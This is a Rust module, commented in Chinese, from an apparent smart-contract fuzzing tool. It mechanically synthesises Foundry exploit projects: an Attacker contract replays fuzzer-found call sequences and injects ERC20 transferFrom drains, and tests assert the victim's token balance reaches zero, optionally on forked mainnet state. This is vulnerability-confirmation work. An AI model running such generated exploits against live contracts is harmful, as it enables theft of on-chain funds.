//! L3 多步攻击 PoC 机械合成（issue #36）：witness = 调用序列（#35）
//! → DeFiHackLabs 式**攻击合约 + 序列驱动**的 Foundry 工程。
//!
//! # 合成形态（零个案，全部机械渲染自 poc.json）
//!
//! - **`src/Attacker.sol`**：攻击合约——构造器收 victim 地址 +
//!   受害资产 mock 地址 + 在场合约表（poc.json deployments，#34）；
//!   `attack()` 按 `Poc.steps` 依次 `target.call{value: v}(data)`，
//!   每步 require(ok)（L1 逐步诚实：失败步如实 revert）。
//! - **逐步独立头形解析**：每步 calldata 经 [`parse_head_shape`]
//!   解析后由 `abi.encodeWithSelector` 重新编码（不退化为硬编码
//!   裸字节串）——**payload 步**（末步，与 L2 同锚）走 L2 的全套
//!   注入（目标槽经定罪呼出目标交叉定位 = 受害资产；动态头形的
//!   尾偏移槽 = `abi.encodeCall(IERC20.transferFrom, …)` 请求；
//!   定长头零词按 debit/recipient/amount 角色序注入；臂 3 洁净性
//!   /零词注入点等 eligibility 与 L2 逐条一致，不满足即 BadShape
//!   诚实降级）；**布置步**（其余步）头形原样重编码（全词逐字
//!   保留，动态尾 verbatim 追加）。
//! - **`test/PoC.t.sol`**：布置（受害资产 mint 给 ROUTER + 目标
//!   字节码 etch + prestate store + 在场合约表 etch + allowance
//!   前提槽 + registry 成员槽）→ 部署 Attacker → `attack()` →
//!   终点断言（每个受害资产的 ROUTER 持仓严格归零——与 L2 同锚）。
//!
//! # 诚实降级（fail-closed 原则不变）
//!
//! 任一步头形解析失败 / payload 步 eligibility 不满足（目标槽
//! 不可定位、多解、臂 3 过滤、零词注入点不足）→ [`PocgenError`]
//! 如实报错，不硬套个案；多步非 arbitrary_call 族在 dispatch
//! 层已降级（synth.rs）。

use std::fmt::Write as _;
use std::path::Path;

use alloy_primitives::U256;
use loom_fuzz_oracle::{hex_bytes, hex_u256, Poc, PocStep};

use crate::synth::{
    addr_expr, deploy_addr, encode_with_selector, head_arg_exprs, head_words_of, ierc20_sol,
    is_erc20_drain_call, mock_erc20_sol, parse_head_shape, render_deploy_etches,
    render_prestate_stores, u256_hex64, vm_sol, ExploitParams, HeadShape, PocgenError,
    ProjectArtifacts, VictimModel, VM_ADDRESS,
};
use crate::synth::{foundry_toml, run_sh, underlying_selector};

/// payload 步的合成模式（issue #61）：
/// - `Drain`：L2 同锚 ERC20 drain 注入（现行行为）。
/// - `L1Only`：fork 直通下价值形态超出 ERC20 drain 模型——payload 照
///   witness 原样重编码，终点断言仅 L1（诚实标注，不伪造绿灯）。
enum PayloadMode {
    Drain(PayloadPlan),
    L1Only,
}

impl std::fmt::Debug for PayloadMode {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            PayloadMode::Drain(plan) => f.debug_tuple("Drain").field(plan).finish(),
            PayloadMode::L1Only => f.write_str("L1Only"),
        }
    }
}

/// 单步的渲染产物：目标地址表达式、value 字面量、data 表达式、
/// 前置声明（request 等）。
struct StepRender {
    target: String,
    value: String,
    decls: String,
    data_expr: String,
    /// L1-only 的 payload 步（issue #61）：结果如实 emit（StepOutcome
    /// 事件），不作 `require(ok)` 硬断言——oracle L1 语义 = 到场 + 臂
    /// 判定，不依赖整笔交易成功（臂后 revert 是合法收尾，同 replay
    /// 模板哲学）。布置步恒为硬断言（真实环境布置必须成功）。
    soft: bool,
}

/// payload 步（末步）的 L2 同锚分析结果：注入点 + 受害资产模型。
#[derive(Debug)]
struct PayloadPlan {
    target_slot: usize,
    tail_slot: Option<usize>,
    model: VictimModel,
}

/// 入口：多步 confirmed poc → L3 工程 + forge test。绿灯返回
/// (工程路径, forge 输出摘要)。
#[allow(clippy::too_many_arguments)] // 参数面 = poc.json 注入上下文的完整传递
pub(crate) fn generate_l3(
    poc: &Poc,
    steps: &[PocStep],
    code_hex: &str,
    out_dir: &Path,
    fork: bool,
    prestate: &[(U256, U256)],
    contract: [u8; 20],
    params: &ExploitParams,
) -> Result<(std::path::PathBuf, String), PocgenError> {
    // 价值影响层（issue #64）：fork 直通 = 资产清单 × 受益槽候选 ×
    // 三族 delta 断言（替代 #61 的整体 L1-only——逐资产标注为缺省
    // 形态）。Genesis 态维持 L2 同锚 mock 模型（无链上资产可测）。
    if fork {
        return generate_l3_profit(poc, steps, out_dir, contract);
    }
    let call = poc.call.as_ref().ok_or_else(|| {
        PocgenError::BadShape("旧 poc 无定罪呼出（#20 前格式）——目标槽不可机械定位".to_string())
    })?;
    let evidence_target = hex_bytes(&call.target).map_err(PocgenError::BadPoc)?;
    if evidence_target.len() != 20 {
        return Err(PocgenError::BadPoc(
            "poc.call.target 非 20 字节".to_string(),
        ));
    }
    let evidence_input = hex_bytes(&call.input).map_err(PocgenError::BadPoc)?;
    let mut evidence_target_arr = [0u8; 20];
    evidence_target_arr.copy_from_slice(&evidence_target);
    let mut target_word = [0u8; 32];
    target_word[12..].copy_from_slice(&evidence_target);
    let evidence_target_word = U256::from_be_bytes(target_word);

    // 逐步独立头形解析 + 表达式渲染（布置步 verbatim；末步按价值
    // 模型 applicability 分派：Drain 注入 / fork 直通 L1Only）。
    let last = steps.len() - 1;
    let mut model = VictimModel::Single;
    let mut l1_only = false;
    let mut renders = Vec::with_capacity(steps.len());
    let mut total_value = U256::ZERO;
    for (i, step) in steps.iter().enumerate() {
        let calldata = hex_bytes(&step.calldata).map_err(PocgenError::BadPoc)?;
        let target = hex_bytes(&step.target).map_err(PocgenError::BadPoc)?;
        if target.len() != 20 {
            return Err(PocgenError::BadPoc(format!(
                "poc.steps[{i}].target 非 20 字节"
            )));
        }
        let mut target_arr = [0u8; 20];
        target_arr.copy_from_slice(&target);
        let value = hex_u256(&step.value).map_err(PocgenError::BadPoc)?;
        total_value += value;
        let shape = parse_head_shape(&calldata)
            .map_err(|e| PocgenError::BadShape(format!("步 {i} 头形解析失败: {e}")))?;
        if i == last {
            match plan_payload(
                &shape,
                evidence_target_word,
                &evidence_input,
                &calldata,
                fork,
            )? {
                PayloadMode::Drain(plan) => {
                    model = plan.model;
                    renders.push(render_payload_step(&shape, &plan, target_arr, value));
                }
                PayloadMode::L1Only => {
                    // 价值形态超出 ERC20 drain 模型（issue #61）：payload
                    // 照 witness 原样重编码（布置步同款渲染），终点断言
                    // 仅 L1（诚实标注，不伪造绿灯）。
                    l1_only = true;
                    let mut r = render_setup_step(i, &shape, &calldata, target_arr, value)?;
                    r.soft = true;
                    renders.push(r);
                }
            }
        } else {
            renders.push(render_setup_step(i, &shape, &calldata, target_arr, value)?);
        }
    }

    let artifacts = ProjectArtifacts {
        files: vec![
            ("src/IERC20.sol".into(), ierc20_sol()),
            ("src/Vm.sol".into(), vm_sol()),
            (
                "src/Attacker.sol".into(),
                attacker_sol(&renders, params, &poc.deployments),
            ),
            (
                "test/PoC.t.sol".into(),
                l3_test_sol(
                    prestate,
                    code_hex,
                    params,
                    &poc.deployments,
                    contract,
                    model,
                    total_value,
                    fork,
                    l1_only,
                    evidence_target_arr,
                ),
            ),
            ("foundry.toml".into(), foundry_toml(fork)),
            ("README.md".into(), readme_l3(fork, l1_only)),
        ]
        .into_iter()
        .chain((!l1_only).then(|| ("src/MockERC20.sol".into(), mock_erc20_sol())))
        .chain(fork.then(|| {
            (
                "run.sh".into(),
                run_sh(poc.fork.as_ref().map(|f| f.block_number)),
            )
        }))
        .collect(),
    };
    artifacts.write(out_dir).map_err(PocgenError::Io)?;
    let summary = crate::project::forge_test(out_dir, fork, poc.fork.as_ref())?;
    Ok((out_dir.to_path_buf(), summary))
}

/// 价值影响层 fork 直通工程（issue #64）：witness 逐字重放 × 受益槽
/// 候选注入 × 三族资产级 delta 断言。机械四元组，零个案：
/// 资产清单来自 trace ∪ 定罪目标，受益槽 = payload 头词 address 形
/// 词，获利族 = ERC20/ETH/ERC721 标准接口探测，取不到的逐资产标注。
fn generate_l3_profit(
    poc: &Poc,
    steps: &[PocStep],
    out_dir: &Path,
    contract: [u8; 20],
) -> Result<(std::path::PathBuf, String), PocgenError> {
    let fork = poc
        .fork
        .as_ref()
        .ok_or_else(|| PocgenError::BadPoc("价值影响层须 fork 直通（poc.fork 在场）".into()))?;
    if steps.is_empty() {
        return Err(PocgenError::BadPoc("steps 为空（契约外形态）".into()));
    }
    let last = steps.len() - 1;
    let calldata = hex_bytes(&steps[last].calldata).map_err(PocgenError::BadPoc)?;
    let shape = parse_head_shape(&calldata)
        .map_err(|e| PocgenError::BadShape(format!("payload 步头形解析失败: {e}")))?;
    if crate::profit::recipient_of(poc).is_none() {
        return Err(PocgenError::BadPoc(
            "payload 末步 caller 非 20 字节（受益人不可机械定位）".into(),
        ));
    }
    let artifacts = ProjectArtifacts {
        files: vec![
            ("src/IERC20.sol".into(), ierc20_sol()),
            ("src/IERC721.sol".into(), crate::profit::ierc721_sol()),
            ("src/Vm.sol".into(), vm_sol()),
            (
                "test/ProfitTest.sol".into(),
                crate::profit::profit_test_sol(poc, &shape, &calldata, contract),
            ),
            ("foundry.toml".into(), foundry_toml(true)),
            ("README.md".into(), readme_profit()),
            ("run.sh".into(), run_sh(Some(fork.block_number))),
        ],
    };
    artifacts.write(out_dir).map_err(PocgenError::Io)?;
    let summary = crate::project::forge_test(out_dir, true, Some(fork))?;
    Ok((out_dir.to_path_buf(), summary))
}

/// 价值影响层 README（issue #64）。
fn readme_profit() -> String {
    r#"# L3 价值影响层 PoC（issue #64，pocgen 机械合成）

判别原则：本工程永远合成"调用序列 + 槽注入 + delta 断言"，
不从"协议怎么被偷"出发；协议特定语义只从 witness 本身读。

- `test/ProfitTest.sol`：每受益槽候选一次 fresh fork，prank
  逐字重放 witness（payload 词[slot] := RECIPIENT），三族
  （ERC20 balanceOf delta / ETH 余额 delta / ERC721 ownerOf
  翻转）资产级断言。
- 取不到的资产逐资产 `AssetUnaffected` 标注（诚实，不伪造
  绿灯）；无候选产生获利 = 红灯 + 全程标注。
- `bash run.sh`（pin 块 fork，anvil Bearer 通路）。
"#
    .to_string()
}

/// payload 步计划（issue #61）：先判价值模型 applicability（零个案
/// 机械锚点），再跑结构 eligibility（与 synth.rs 单步路径逐条一致的
/// L2 同锚检查）。
///
/// 价值模型锚点（三选一即适用）：
/// 1. 臂 3 转发尾在场（动态尾解释 + 定罪证据子串）——注入 = 请求
///    本体；
/// 2. 定罪呼出 selector == `underlying()`（pegged 探针，issue #28）；
/// 3. 定罪呼出形状 == ERC20 transfer/transferFrom（臂 1 证据即盗窃
///    调用本体）。
///
/// 均不满足 = 价值形态超出 ERC20 drain 模型（如 TeamFinance migrate
/// 的 V3 仓位迁移形态）：fork 直通 → `L1Only`（payload verbatim + 仅
/// L1 断言，诚实标注不伪造绿灯）；Genesis 无链上环境可直通 →
/// BadShape 如实降级。模型适用但结构 eligibility 失败（目标槽歧义 /
/// 臂 3 过滤 / 零词注入点不足）：fork → `L1Only` fail-soft；Genesis →
/// BadShape（现行行为不回归）。
fn plan_payload(
    shape: &HeadShape,
    evidence_target_word: U256,
    evidence_input: &[u8],
    calldata: &[u8],
    fork: bool,
) -> Result<PayloadMode, PocgenError> {
    // 动态尾解释先经定罪证据门槛（与 analyze_payload 同语义：
    // 定罪呼出 input 是 payload calldata 的子串才算转发证据）。
    let mut tail_slot = shape.tail_slot;
    if tail_slot.is_some() {
        let forwarded = !evidence_input.is_empty()
            && evidence_input.len() <= calldata.len()
            && calldata
                .windows(evidence_input.len())
                .any(|w| w == evidence_input);
        if !forwarded {
            tail_slot = None;
        }
    }
    let value_model = tail_slot.is_some()
        || evidence_input
            .first_chunk::<4>()
            .is_some_and(|sel| u32::from_be_bytes(*sel) == underlying_selector())
        || is_erc20_drain_call(evidence_input);
    if !value_model {
        return if fork {
            Ok(PayloadMode::L1Only)
        } else {
            Err(PocgenError::BadShape(
                "价值形态超出 ERC20 drain 模型（payload 无臂 3 转发尾；定罪呼出非 drain/underlying 探针形）；Genesis 态如实降级（fork 直通下将降级为仅 L1 断言）".to_string(),
            ))
        };
    }
    match analyze_payload(shape, evidence_target_word, evidence_input, calldata) {
        Ok(plan) => Ok(PayloadMode::Drain(plan)),
        // 模型在场但结构 eligibility 失败：fork 直通fail-soft 到 L1Only
        // （payload verbatim 仍可重放）；Genesis 维持 BadShape。
        Err(_) if fork => Ok(PayloadMode::L1Only),
        Err(e) => Err(e),
    }
}

/// payload 步的 L2 同锚 eligibility（与 synth.rs 单步路径逐条一致）：
/// 目标槽经定罪呼出目标交叉定位（唯一匹配）；动态头解释需臂 3 转发
/// 证据（定罪呼出 input 是 payload calldata 的子串），否则回退定长头；
/// 动态头的臂 3 洁净性过滤；定长头的零词注入点 ≥ 3（角色序放置）。
fn analyze_payload(
    shape: &HeadShape,
    evidence_target_word: U256,
    evidence_input: &[u8],
    calldata: &[u8],
) -> Result<PayloadPlan, PocgenError> {
    let mut tail_slot = shape.tail_slot;
    if tail_slot.is_some() {
        // 臂 3 转发证据（issue #28 同语义）：定罪呼出 input 是 payload
        // calldata 的字节子串（memmem 级）。
        let forwarded = !evidence_input.is_empty()
            && evidence_input.len() <= calldata.len()
            && calldata
                .windows(evidence_input.len())
                .any(|w| w == evidence_input);
        if !forwarded {
            tail_slot = None;
        }
    }
    let head_words = head_words_of(shape);
    let target_hits: Vec<usize> = head_words
        .iter()
        .enumerate()
        .filter(|(_, w)| **w == evidence_target_word)
        .map(|(i, _)| i)
        .collect();
    let target_slot = match target_hits.len() {
        1 => target_hits[0],
        0 => {
            return Err(PocgenError::BadShape(
                "无头词匹配定罪呼出目标——目标槽不可机械定位".to_string(),
            ))
        }
        _ => {
            return Err(PocgenError::BadShape(format!(
                "多个头词匹配定罪呼出目标（歧义）：槽 {target_hits:?}"
            )))
        }
    };
    if tail_slot.is_some() && !shape.arm3_eligible {
        return Err(PocgenError::BadShape(
            "臂 3 过滤：槽 0 非地址洁净（动态头候选被过滤）".to_string(),
        ));
    }
    if tail_slot.is_none() {
        let zero_slots = head_words
            .iter()
            .enumerate()
            .filter(|(i, w)| **w == U256::ZERO && *i != target_slot)
            .count();
        if zero_slots < 3 {
            return Err(PocgenError::BadShape(format!(
                "定长头零词注入点不足（{zero_slots} < 3），debit/recipient/amount 角色无法机械放置"
            )));
        }
    }
    let model = match evidence_input.first_chunk::<4>() {
        Some(sel) if u32::from_be_bytes(*sel) == underlying_selector() => VictimModel::Pegged,
        _ => VictimModel::Single,
    };
    Ok(PayloadPlan {
        target_slot,
        tail_slot,
        model,
    })
}

/// 布置步渲染：头形原样重编码（全词逐字 `uint256(0x…)`，动态尾
/// verbatim 追加）——布置语义（存储布置/授权等）由 witness 步
/// calldata 原样承载，不做价值注入。
fn render_setup_step(
    i: usize,
    shape: &HeadShape,
    calldata: &[u8],
    target: [u8; 20],
    value: U256,
) -> Result<StepRender, PocgenError> {
    let head_words = head_words_of(shape);
    let args: Vec<String> = head_words
        .iter()
        .map(|w| format!("uint256(0x{})", u256_hex64(*w)))
        .collect();
    let prefix = encode_with_selector(&format!("{:#06x}", shape.selector), &args);
    let data_expr = if shape.tail_slot.is_some() {
        // 尾区 = calldata 头后的原始字节（长度字 + 内容），verbatim。
        let head_bytes = 4 + head_words.len() * 32;
        if calldata.len() < head_bytes {
            return Err(PocgenError::BadShape(format!(
                "步 {i} calldata 短于头宽（{} < {head_bytes}）",
                calldata.len()
            )));
        }
        let tail_hex: String = calldata[head_bytes..].iter().fold(
            String::with_capacity((calldata.len() - head_bytes) * 2),
            |mut s, b| {
                let _ = write!(s, "{b:02x}");
                s
            },
        );
        format!("abi.encodePacked({prefix}, hex\"{tail_hex}\")")
    } else {
        prefix
    };
    Ok(StepRender {
        target: addr_expr(target),
        value: value.to_string(),
        decls: String::new(),
        data_expr,
        soft: false,
    })
}

/// payload 步渲染：L2 同锚注入（目标槽 = 受害资产；尾偏移槽 =
/// transferFrom 请求；零词角色序）。
fn render_payload_step(
    shape: &HeadShape,
    plan: &PayloadPlan,
    target: [u8; 20],
    value: U256,
) -> StepRender {
    let head_words = head_words_of(shape);
    // Attacker.sol 上下文：受害资产 = asset immutable，debit 角色 = router。
    let arg_exprs = head_arg_exprs(
        head_words,
        plan.target_slot,
        plan.tail_slot,
        "address(asset)",
        "router",
    );
    let data_expr = encode_with_selector(&format!("{:#06x}", shape.selector), &arg_exprs);
    let decls = if plan.tail_slot.is_some() {
        "        bytes memory request =\n            abi.encodeCall(IERC20.transferFrom, (router, ATTACKER, BALANCE));\n"
            .to_string()
    } else {
        String::new()
    };
    StepRender {
        target: addr_expr(target),
        value: value.to_string(),
        decls,
        data_expr,
        soft: false,
    }
}

/// Attacker.sol（机械模板）：构造器收 victim + 受害资产 + 在场合约
/// 表；attack() 按 witness 序列逐步 `target.call{value}(data)`。
fn attacker_sol(
    renders: &[StepRender],
    params: &ExploitParams,
    deployments: &[loom_fuzz_oracle::PocDeployment],
) -> String {
    let attacker = format!(
        "address(uint160(0x{}))",
        u256_hex64(U256::from_be_bytes({
            let mut w = [0u8; 32];
            w[12..].copy_from_slice(&params.attacker);
            w
        }))
        .trim_start_matches('0')
    );
    // 在场合约表 immutable 字段 + 构造参数（机械逐字段）。
    let mut fields = String::new();
    let mut ctor_params = String::from("address _router, address _asset");
    let mut ctor_body = String::from("        router = _router;\n        asset = _asset;\n");
    for (i, _d) in deployments.iter().enumerate() {
        let _ = writeln!(fields, "    address private immutable field{i};");
        let _ = write!(ctor_params, ", address _field{i}");
        let _ = writeln!(ctor_body, "        field{i} = _field{i};");
    }
    let mut attack_body = String::new();
    let mut step_fns = String::new();
    let mut soft_used = false;
    for (i, r) in renders.iter().enumerate() {
        let tag = if i == renders.len() - 1 {
            if r.soft {
                "payload（witness 原样重编码——价值形态超出 ERC20 模型，仅 L1 断言）"
            } else {
                "payload（L2 同锚注入）"
            }
        } else {
            "setup（witness 原样重编码）"
        };
        // 每步独立成函数：宽头函数的 payload 步声明多（TeamFinance
        // migrate 17 词头），同作用域堆叠触发 Stack too deep；步级
        // 作用域让编译器复用槽位（不经 via_ir，避开 0.8.19 IR 段错误）。
        let _ = writeln!(attack_body, "        step{i}(); // 步 {i}（{tag}）");
        let _ = writeln!(step_fns, "\n    function step{i}() internal {{");
        step_fns.push_str(&r.decls);
        let _ = writeln!(step_fns, "        bytes memory data{i} = {};", r.data_expr);
        if r.soft {
            // L1-only payload（issue #61）：结果如实 emit，不作硬断言
            // （oracle L1 语义不依赖整笔成功；臂后 revert 合法）。
            soft_used = true;
            let _ = writeln!(
                step_fns,
                "        (bool ok{i}, bytes memory ret{i}) = {}.call{{value: {}, gas: 4_000_000}}(data{i});",
                r.target, r.value
            );
            let _ = writeln!(step_fns, "        emit StepOutcome({i}, ok{i}, ret{i});");
        } else {
            let _ = writeln!(
                step_fns,
                "        (bool ok{i}, ) = {}.call{{value: {}, gas: 4_000_000}}(data{i});",
                r.target, r.value
            );
            let _ = writeln!(step_fns, "        require(ok{i}, \"L3 step {i} failed\");");
        }
        let _ = writeln!(step_fns, "    }}");
    }
    let outcome_event = if soft_used {
        "\n    /// L1-only payload 步结果（issue #61）：如实呈现，不作硬断言。\n    event StepOutcome(uint256 step, bool ok, bytes returndata);\n"
    } else {
        ""
    };
    format!(
        r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {{IERC20}} from "./IERC20.sol";

/// L3 攻击合约（loom-fuzz-pocgen 机械合成，勿手改——重生成覆盖）。
/// witness = 调用序列（poc.json steps，issue #35）：attack() 按序
/// 逐步 target.call{{value: v}}(data)——data 由各步 witness calldata
/// 头形解析后经 abi 编码重新表达（非硬编码裸字节串；payload 步的
/// 槽替换 = L2 同锚的价值注入，价值形态超出 ERC20 模型时 payload
/// 照 witness 原样重编码、结果经 StepOutcome 如实 emit——issue #61）。
/// 构造器收 victim 地址 + 受害资产/臂证据资产 + 在场合约表
/// （poc.json deployments，issue #34）。
contract Attacker {{
    address private immutable router; // victim（分析合约）
    address private immutable asset; // 受害资产 mock / 臂证据资产（L2 同锚注入对象）
{fields}
    address private constant ATTACKER = {attacker};
    uint256 private constant BALANCE = {balance};
{outcome_event}
    constructor({ctor_params}) {{
{ctor_body}    }}

    function attack() external {{
{attack_body}    }}
{step_fns}}}
"#,
        balance = params.balance,
    )
}

/// L3 测试体（机械合成）：布置（资产模型 + 目标/在场合约表布置 +
/// prestate/前提槽）→ 部署 Attacker → attack() → 终点断言。
///
/// 终点断言两形态（issue #61，机械分派非个案）：
/// - Drain（默认）：L2 同锚——每个受害资产的 ROUTER 持仓严格归零。
/// - L1Only（fork 直通 + 价值形态超出 ERC20 drain 模型）：布置步真实
///   成功（硬断言）+ payload 步结果由 Attacker 如实 emit（不作硬断言
///   ——oracle L1 语义不依赖整笔成功）；臂证据资产的受害地址余额变化
///   经 AffectedAssetBalance 事件展示，**价值断言局限如实标注**。
///
/// fork 直通（issue #61）：fork 态**不 etch 分析对象**——真链上状态
/// （pin 块）即执行环境，proxy 部署态（initializer/owner/标志槽）自然
/// 在场；poc.json 的 deployments（fuzz 期部署的应答/代理合约）链上
/// 不在场，仍逐字 etch（既有逻辑）。
#[allow(clippy::too_many_arguments)]
fn l3_test_sol(
    prestate: &[(U256, U256)],
    code_hex: &str,
    params: &ExploitParams,
    deployments: &[loom_fuzz_oracle::PocDeployment],
    contract: [u8; 20],
    model: VictimModel,
    total_value: U256,
    fork: bool,
    l1_only: bool,
    evidence_asset: [u8; 20],
) -> String {
    let router = addr_expr(contract);
    let attacker = format!(
        "address(uint160(0x{}))",
        u256_hex64(U256::from_be_bytes({
            let mut w = [0u8; 32];
            w[12..].copy_from_slice(&params.attacker);
            w
        }))
        .trim_start_matches('0')
    );
    let (victim_setup, victim_asserts, ctor_asset, allowance_stores, l1_event, l1_before) =
        if l1_only {
            // L1-only：无受害资产 mock（不伪造价值环境）；ASSET = 臂证据
            // 受影响资产（真链上地址），其受害地址余额变化仅作证据
            // 展示（emit），不作硬断言——诚实标注价值断言局限。
            (
                String::new(),
                "        uint256 balanceAfter = IERC20(ASSET).balanceOf(ROUTER);\n        emit AffectedAssetBalance(ASSET, balanceBefore, balanceAfter);\n".to_string(),
                addr_expr(evidence_asset),
                String::new(),
                "    /// L1-only（issue #61）证据事件：臂证据受影响资产的受害\n    /// 地址余额变化——展示用，不作硬断言（诚实标注，不伪造绿灯）。\n    event AffectedAssetBalance(address asset, uint256 beforeBalance, uint256 afterBalance);\n\n".to_string(),
                "        uint256 balanceBefore = IERC20(ASSET).balanceOf(ROUTER);\n".to_string(),
            )
        } else {
            let (setup, asserts) = match model {
                VictimModel::Single => (
                    "        MockERC20 token = new MockERC20(address(0));\n        token.mint(ROUTER, BALANCE);\n".to_string(),
                    "        require(\n            token.balanceOf(ROUTER) == 0,\n            string.concat(\"L3: token holding not drained: \", _toString(token.balanceOf(ROUTER)))\n        );\n".to_string(),
                ),
                VictimModel::Pegged => (
                    "        MockERC20 underlyingAsset = new MockERC20(address(0));\n        MockERC20 token = new MockERC20(address(underlyingAsset));\n        token.mint(ROUTER, BALANCE);\n        underlyingAsset.mint(ROUTER, BALANCE);\n".to_string(),
                    "        require(\n            token.balanceOf(ROUTER) == 0,\n            string.concat(\"L3: token holding not drained: \", _toString(token.balanceOf(ROUTER)))\n        );\n        require(\n            underlyingAsset.balanceOf(ROUTER) == 0,\n            string.concat(\"L3: underlying holding not drained: \", _toString(underlyingAsset.balanceOf(ROUTER)))\n        );\n".to_string(),
                ),
            };
            let mut allowance = String::new();
            allowance.push_str(
                "        vm.store(\n            address(token),\n            keccak256(abi.encode(ROUTER, keccak256(abi.encode(ROUTER, uint256(1))))),\n            bytes32(BALANCE)\n        );\n",
            );
            if model == VictimModel::Pegged {
                allowance.push_str(
                    "        vm.store(\n            address(underlyingAsset),\n            keccak256(abi.encode(ROUTER, keccak256(abi.encode(ROUTER, uint256(1))))),\n            bytes32(BALANCE)\n        );\n",
                );
            }
            (
                setup,
                asserts,
                "address(token)".to_string(),
                allowance,
                String::new(),
                String::new(),
            )
        };
    let mut stores = render_prestate_stores(prestate);
    if !l1_only {
        stores.push_str(
            "        // VICTIM_ASSET 作为 service 的 registry 成员布置（价值影响前提）。\n",
        );
        stores.push_str(
            "        vm.store(ROUTER, keccak256(abi.encode(address(token), uint256(0))), bytes32(uint256(1)));\n",
        );
    }
    stores.push_str(&render_deploy_etches(deployments));

    // 目标合约布置：Genesis = etch poc.json 字节码；fork 直通 = 不
    // etch（真链上状态即环境——proxy 部署态自然在场，issue #61）。
    let etch_line = if fork {
        "        // fork 直通（issue #61）：不 etch 分析对象——真链上状态（pin 块）\n        // 即执行环境；proxy 部署态（initializer/owner/标志槽）自然在场。\n        // （Genesis 态才 etch poc.json 字节码。）\n".to_string()
    } else {
        format!("        vm.etch(ROUTER, hex\"{code_hex}\");\n")
    };
    let asset_const = if l1_only {
        format!(
            "    address constant ASSET = {};\n",
            addr_expr(evidence_asset)
        )
    } else {
        String::new()
    };

    // 构造实参：受害资产 mock（Drain）/ 臂证据资产（L1Only）+ 在场合
    // 约表地址（机械逐个）。
    let mut ctor_args = format!("ROUTER, {ctor_asset}");
    for d in deployments {
        let _ = write!(ctor_args, ", {}", addr_expr(deploy_addr(d)));
    }
    let deal_line = if total_value > U256::ZERO {
        format!("        vm.deal(address(attacker), {});\n", total_value)
    } else {
        String::new()
    };
    let l1_annotation = if l1_only {
        "        // L1-only 终点断言（issue #61）：价值形态超出 ERC20 drain 模型\n        // （payload 无臂 3 转发尾；定罪呼出非 drain/underlying 探针形）——\n        // 终点断言仅 L1 层：布置步真实成功（proxy 部署态在场的证据，\n        // 硬断言）+ payload 步可执行（结果由 Attacker 的 StepOutcome\n        // 如实 emit，臂后 revert 合法——oracle L1 语义不依赖整笔成功）。\n        // 价值断言：形态超出 ERC20 模型，仅 L1（fail-soft 如实标注）。\n"
    } else {
        ""
    };
    // L1Only 无受害资产 mock：MockERC20 文件与 import 同步缺席（不伪造
    // 价值环境——终点断言仅 L1 的如实标注由工程形态本身承载）。
    let mock_import = if l1_only {
        ""
    } else {
        "import {MockERC20} from \"../src/MockERC20.sol\";\n"
    };
    // L1Only 的余额证据事件用 IERC20（ASSET 余额快照）。
    let ierc20_import = if l1_only {
        "import {IERC20} from \"../src/IERC20.sol\";\n"
    } else {
        ""
    };
    let setup_comment = if l1_only {
        "        // 资产模型：L1-only 无受害资产 mock——不伪造价值环境（issue #61）。\n"
    } else {
        "        // 资产模型（L2 同锚）：受害资产全额 mint 给 ROUTER。\n"
    };
    let final_assert_comment = if l1_only {
        "        // 价值断言：形态超出 ERC20 模型，仅 L1——余额变化仅作证据 emit。\n"
    } else {
        "        // 终点断言（L2 同锚）：每个受害资产的 ROUTER 持仓严格归零。\n"
    };

    format!(
        r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

{mock_import}{ierc20_import}import {{Attacker}} from "../src/Attacker.sol";
import {{Vm}} from "../src/Vm.sol";

/// L3 exploit PoC（loom-fuzz-pocgen 机械合成，勿手改——重生成覆盖）。
///
/// witness = 调用序列（poc.json steps）：布置（资产模型 + 目标/在场
/// 合约表布置 + prestate/前提槽）→ 部署攻击合约（构造器收 victim +
/// 受害资产/臂证据资产 + 在场合约表）→ attacker.attack() 按序重放
/// → 终点断言（Drain = 每个受害资产的 ROUTER 持仓严格归零，L2 同锚；
/// L1Only = 仅 L1 层断言 + 价值断言局限如实标注，issue #61）。
contract PoC {{
    Vm constant vm = Vm({VM_ADDRESS});
    address constant ROUTER = {router};
    address constant ATTACKER = {attacker};
    uint256 constant BALANCE = {balance};
{asset_const}{l1_event}
    function testExploit() public {{
{setup_comment}{victim_setup}
        // 目标合约布置：Genesis = etch 字节码；fork 直通 = 真链上状态。
{etch_line}{stores}{allowance_stores}
        // 攻击合约：构造器收 victim 地址 + 受害资产/臂证据资产 + 在场合约表。
        Attacker attacker = new Attacker({ctor_args});
{deal_line}{l1_annotation}{l1_before}        attacker.attack();

{final_assert_comment}{victim_asserts}    }}

    function _toString(uint256 v) internal pure returns (string memory) {{
        if (v == 0) return "0";
        bytes memory buf = new bytes(78);
        uint256 i = buf.length;
        while (v > 0) {{
            i--;
            buf[i] = bytes1(uint8(48 + (v % 10)));
            v /= 10;
        }}
        bytes memory out = new bytes(buf.length - i);
        for (uint256 j = 0; j < out.length; j++) {{
            out[j] = buf[i + j];
        }}
        return string(out);
    }}
}}
"#,
        balance = params.balance,
    )
}

/// L3 工程 README。
fn readme_l3(fork: bool, l1_only: bool) -> String {
    let mut s = String::new();
    s.push_str(
        r#"# loom-fuzz exploit PoC（L3 多步攻击层，issue #36）

机械合成自 confirmed 的多步 poc.json（loom-fuzz-pocgen）——**forge
test 绿灯 = 终判**。witness = 调用序列：攻击合约（`src/Attacker.sol`）
的 `attack()` 按 `Poc.steps` 依次 `target.call{value}(calldata)`——
calldata 由各步 witness 头形解析后经 abi 编码重新表达（payload 末步
的槽替换 = L2 同锚价值注入：目标槽 = 受害资产、动态尾 = transferFrom
请求、零词角色序）。**无法机械合成时 pocgen 如实降级（BadShape /
NoGenericAction），不硬套个案。**

```sh
forge test          # 字节码模式（默认，离线）
```

## 结构

- `src/Attacker.sol`：机械合成的攻击合约（构造器收 victim + 受害
  资产/臂证据资产 + 在场合约表；attack() 序列驱动）。
- `src/MockERC20.sol`：受害资产（槽布局钉死：balanceOf = slot 0、
  allowance = slot 1——vm.store 机械公式的依据）。L1-only 工程无此
  文件（无受害资产 mock）。
- `test/PoC.t.sol`：布置 → 部署 Attacker → attack() → 终点断言。

"#,
    );
    if fork {
        s.push_str(
            r#"## fork 直通模式（BlockMachine，issue #61）

fork 态**不 etch 分析对象**：真链上状态（pin 块）即执行环境——
proxy 部署态（initializer/owner/标志槽）自然在场（Genesis 态把 impl
字节码 etch 到裸地址重放，无部署态存储，真实函数路径走不通）。
